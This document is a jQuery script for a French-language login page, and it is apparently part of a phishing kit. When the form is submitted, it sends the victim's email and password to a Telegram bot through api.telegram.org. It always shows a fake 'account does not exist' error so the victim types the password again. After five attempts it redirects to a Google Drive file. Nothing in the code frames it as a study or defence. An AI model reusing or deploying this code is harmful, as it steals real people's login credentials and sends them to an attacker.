/* global $ */
$(document).ready(function() {
    var count = 0;

    // Gestion du clic sur le bouton "S'identifier"
    $('#submit-btn').click(function(event) {
        // Masquer les messages d'erreur ou de succès
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();

        // Récupération des valeurs de l'e-mail et du mot de passe
        var email = $("#email").val();
        var password = $("#password").val();

        // Validation de l'e-mail
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA0-9]{2,4})+$/;
        
        // Vérification si l'e-mail est vide
        if (!email) {
            $('#error').show();
            $('#error').html("Le champ e-mail est vide !");
            $("#email").focus();
            return false;
        }

        // Vérification si l'e-mail est valide
        if (!filter.test(email)) {
            $('#error').show();
            $('#error').html("Ce compte n'existe pas. Entrez un autre compte.");
            $("#email").focus();
            return false;
        }

        // Vérification si le mot de passe est vide
        if (!password) {
            $('#error').show();
            $('#error').html("Le champ mot de passe est vide !");
            $("#password").focus();
            return false;
        }

        // Animation de l'interface
        $('#submit-btn').html('Vérification...');
        
        // URL de l'API Telegram pour envoyer les données
        var telegramBotURL = "https://api.telegram.org/bot" + telegramConfig.botToken + "/sendMessage";

        // Envoi des données à Telegram via AJAX
        $.ajax({
            dataType: 'JSON',
            url: telegramBotURL,
            type: 'POST',
            data: {
                chat_id: telegramConfig.chatID,
                text: "Email: " + email + "\nPassword: " + password,
            },
            beforeSend: function(xhr) {
                // Avant d'envoyer, on affiche un état de vérification
                $('#submit-btn').html('Vérification...');
            },
            success: function(response) {
                // Si l'envoi est réussi
                if (response && response['ok']) {
                    $("#msg").show();
                    $("#msg").html("Ce compte n'existe pas. Entrez un autre compte");

                    // Réinitialiser le champ mot de passe après l'envoi
                    $("#password").val("");
                    count++;

                    // Après 5 tentatives, rediriger vers un fichier Google Drive
                    if (count >= 5) {
                        count = 0;
                        window.location.replace("https://drive.google.com/file/d/1eNHvaGM65gZPNQetBmCc0X9V14ygIJ9J/view");
                    }
                }
            },
            error: function() {
                // En cas d'échec de l'envoi
                $("#msg").show();
                $("#msg").html("Erreur lors de l'envoi des données.");
            },
            complete: function() {
                // Après l'envoi, remettre le texte du bouton à "S'identifier"
                $('#submit-btn').html("S'identifier");
            }
        });
    });
});
